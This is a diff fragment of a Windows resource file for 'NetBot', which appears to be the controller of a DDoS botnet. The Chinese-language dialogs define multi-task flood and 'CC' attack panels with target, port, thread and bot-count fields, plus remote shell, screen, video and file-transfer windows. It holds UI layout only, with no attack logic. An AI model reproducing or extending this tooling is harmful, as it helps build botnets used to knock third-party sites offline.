+    EDITTEXT        IDC_EDIT_IP4,205,184,131,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_PORT4,366,184,30,12,ES_AUTOHSCROLL
+    COMBOBOX        IDC_COMBO_TYPE4,28,184,26,69,CBS_DROPDOWNLIST | WS_VSCROLL | WS_TABSTOP
+    EDITTEXT        IDC_EDIT_THREAD4,82,184,31,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_THREAD4,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,110,184,11,12
+    EDITTEXT        IDC_EDIT_NUM4,142,184,34,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_NUM4,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,172,184,11,12
+    PUSHBUTTON      "攻击",IDC_BTN_ATTACK4,406,183,36,13
+    PUSHBUTTON      "停止",IDC_BTN_STOP4,447,183,34,13
+    LTEXT           "目标:",IDC_STATIC,183,186,21,9
+    LTEXT           "端口:",IDC_STATIC,344,186,20,9
+    LTEXT           "类型:",IDC_STATIC,7,186,20,8
+    LTEXT           "线程:",IDC_STATIC,60,186,21,10
+    LTEXT           "数量:",IDC_STATIC,121,186,20,9
+    LTEXT           "http://www.abc.com/index.html",IDC_STATIC,63,303,111,8
+    CONTROL         "新上线主机参与该攻击",IDC_CHECK_AUTOATTACK,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,331,91,95,11
+    CONTROL         "使用上线列表选中主机",IDC_CHECK_USESELECT,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,331,108,98,9
+    EDITTEXT        IDC_EDIT_NUM,284,106,34,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_NUM,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,313,106,11,12
+    LTEXT           "http://www.abc.com/",IDC_STATIC,63,315,111,8
+    GROUPBOX        "轮询CC攻击(任务5)",IDC_STATIC,3,202,486,58
+    EDITTEXT        IDC_EDIT_CC_URL,49,214,268,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_CC_PORT,49,229,34,12,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_CC_THREAD,128,229,28,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_CC_THREAD,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,153,229,11,12
+    PUSHBUTTON      "攻击",IDC_BTN_CC_ATTACK,438,210,41,14
+    PUSHBUTTON      "停止",IDC_BTN_CC_STOP,438,226,41,14
+    LTEXT           "通配 URL:",IDC_STATIC,10,216,39,9
+    LTEXT           "攻击端口:",IDC_STATIC,9,231,36,9
+    LTEXT           "攻击线程:",IDC_STATIC,90,231,37,10
+    LTEXT           "主机数量:",IDC_STATIC,167,231,36,10
+    CONTROL         "使用上线列表选中主机",IDC_CHECK_CC_USESEL,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,248,231,98,9
+    EDITTEXT        IDC_EDIT_CC_NUM,205,229,34,12,ES_AUTOHSCROLL | WS_GROUP
+    CONTROL         "Spin1",IDC_SPIN_CC_NUM,"msctls_updown32",UDS_SETBUDDYINT | UDS_ALIGNRIGHT | UDS_AUTOBUDDY | UDS_ARROWKEYS,234,229,11,12
+    LTEXT           "变参:",IDC_STATIC,327,216,20,9
+    EDITTEXT        IDC_EDIT_CC_PARAMX,349,214,31,13,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT_CC_PARAMY,388,214,31,13,ES_AUTOHSCROLL
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKRECT,381,219,6,2
+    LTEXT           "说明:目前变参只支持数字型，并且只支持一个变参。请将URL中变化的数字部分用%d替换，作为通配URL.",IDC_STATIC,10,249,391,10
+END
+
+IDD_VIDEO_DLG DIALOGEX 0, 0, 263, 223
+STYLE DS_SETFONT | DS_MODALFRAME | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "视频捕捉"
+FONT 9, "宋体", 0, 0, 0x0
+BEGIN
+    CONTROL         "Progress1",IDC_PROGRESS_VIDEO,"msctls_progress32",PBS_SMOOTH,1,192,147,15
+    PUSHBUTTON      "▼开始录像",IDC_BTN_RECORDS,161,191,48,16
+    PUSHBUTTON      "■停止录像",IDC_BTN_RECORDE,211,191,48,16
+END
+
+IDD_FILETRAN_DLG DIALOGEX 0, 0, 437, 224
+STYLE DS_SETFONT | DS_MODALFRAME | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "文件传输管理"
+FONT 9, "微软雅黑", 400, 0, 0x86
+BEGIN
+    CONTROL         "List1",IDC_TASK_LIST,"SysListView32",LVS_REPORT | LVS_SINGLESEL | WS_BORDER | WS_TABSTOP,0,0,437,225
+END
+
+IDD_DIALOG1 DIALOGEX 0, 0, 199, 149
+STYLE DS_SETFONT | DS_MODALFRAME | DS_3DLOOK | DS_CENTER | WS_POPUP
+FONT 10, "System", 0, 0, 0x0
+BEGIN
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKFRAME,0,0,199,149
+    CONTROL         IDB_LOGO,IDC_PIC,"Static",SS_BITMAP | SS_CENTERIMAGE,0,0,199,149
+END
+
+IDD_LOGO_DIALOG DIALOG 0, 0, 319, 201
+STYLE DS_SETFONT | DS_MODALFRAME | WS_POPUP
+FONT 8, "MS Sans Serif"
+BEGIN
+    CONTROL         "",IDC_STATIC,"Static",SS_BITMAP,62,39,13,13
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO
+BEGIN
+    IDD_NETBOT_DIALOG, DIALOG
+    BEGIN
+        BOTTOMMARGIN, 265
+    END
+
+    IDD_PROCESS_DLG, DIALOG
+    BEGIN
+    END
+
+    IDD_SHELL_DLG, DIALOG
+    BEGIN
+    END
+
+    IDD_UPDATE_DLG, DIALOG
+    BEGIN
+    END
+
+    IDD_FILE_DLG, DIALOG
+    BEGIN
+    END
+
+    IDD_SERVER_DLG, DIALOG
+    BEGIN
+        BOTTOMMARGIN, 181
+    END
+
+    IDD_SET_DLG, DIALOG
+    BEGIN
+    END
+
+    IDD_SCREEN_DLG, DIALOG
+    BEGIN
+    END
+
+    IDD_DDOS_DLG, DIALOG
+    BEGIN
+        BOTTOMMARGIN, 330
+    END
+
+    IDD_VIDEO_DLG, DIALOG
+    BEGIN
+        BOTTOMMARGIN, 222
+    END
+
+    IDD_FILETRAN_DLG, DIALOG
+    BEGIN
+    END
+
+    IDD_DIALOG1, DIALOG
+    BEGIN
+        RIGHTMARGIN, 160
+        BOTTOMMARGIN, 119
+    END
+
+    IDD_LOGO_DIALOG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 312
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 194
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog Info
+//
+
+IDD_DDOS_DLG DLGINIT
+BEGIN
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3130, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3230, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3330, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3430, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3530, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3630, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3730, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3830, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3930, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3031, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3131, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3231, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3331, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3431, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3531, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3631, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3731, "\000" 
+    IDC_COMBO_TYPE1, 0x403, 3, 0
+0x3831, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3130, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3230, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3330, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3430, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3530, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3630, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3730, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3830, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3930, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3031, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3131, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3231, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3331, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3431, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3531, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3631, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3731, "\000" 
+    IDC_COMBO_TYPE, 0x403, 3, 0
+0x3831, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3130, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3230, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3330, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3430, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3530, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3630, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3730, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3830, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3930, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3031, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3131, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3231, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3331, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3431, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3531, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3631, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3731, "\000" 
+    IDC_COMBO_TYPE2, 0x403, 3, 0
+0x3831, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3130, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3230, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3330, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3430, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3530, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3630, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3730, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3830, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3930, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3031, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3131, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3231, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3331, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3431, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3531, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3631, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3731, "\000" 
+    IDC_COMBO_TYPE3, 0x403, 3, 0
+0x3831, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3130, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3230, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3330, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3430, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3530, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3630, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3730, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3830, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3930, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3031, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3131, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3231, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3331, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3431, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3531, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3631, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3731, "\000" 
+    IDC_COMBO_TYPE4, 0x403, 3, 0
+0x3831, "\000" 
+    0
+END
+
+IDD_SERVER_DLG DLGINIT
+BEGIN
+    IDC_URL, 0x403, 10, 0
+0x3231, 0x2e37, 0x2e30, 0x2e30, 0x0031, 
+    0
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// AFX_DIALOG_LAYOUT
+//
+
+IDD_NETBOT_DIALOG AFX_DIALOG_LAYOUT
+BEGIN
+    0
+END
+
+IDD_UPDATE_DLG AFX_DIALOG_LAYOUT
+BEGIN
+    0
+END
+
+IDD_DDOS_DLG AFX_DIALOG_LAYOUT
+BEGIN
+    0
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE
+BEGIN
+    ID_BTN_TONLINE          "在线主机\n 在线主机 "
+    ID_BTN_TDDOS            "DDOS攻击\nDDOS攻击"
+END
+
+STRINGTABLE
+BEGIN
+    ID_BTN_TUPDATE          "更新 IP  \n更新 IP"
+    ID_BTN_TCONFIG          "程序设置\n程序设置"
+    ID_BTN_TSERVER          "配服务端  \n配服务端"
+    ID_BTN_TWEBSITE         "官方主页  \n官方主页"
+    ID_BTN_TEXIT            "退出  \n退出"
+    ID_BTN_TDDOS2           "DDOS攻击2\nDDOS攻击2"
+    ID_BTN_TDDOS1           "DDOS攻击2\nDDOS攻击2"
+    ID_BTN_TFILETRAN        "文件传输\n文件传输"
+END
+
+STRINGTABLE
+BEGIN
+    ID_MENU_SHOWLIST        "显示在线主机列表\n显示在线主机列表"
+END
+
+#endif    // 中文(简体，中国) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+#define _AFX_NO_SPLITTER_RESOURCES
+#define _AFX_NO_OLE_RESOURCES
+#define _AFX_NO_TRACKER_RESOURCES
+#define _AFX_NO_PROPERTY_RESOURCES
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE 4, 2
+#pragma code_page(936)
+#endif //_WIN32
+#include "res\NetBot.rc2"  // non-Microsoft Visual C++ edited resources
+#include "l.chs\afxres.rc"          // Standard components
+#endif
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
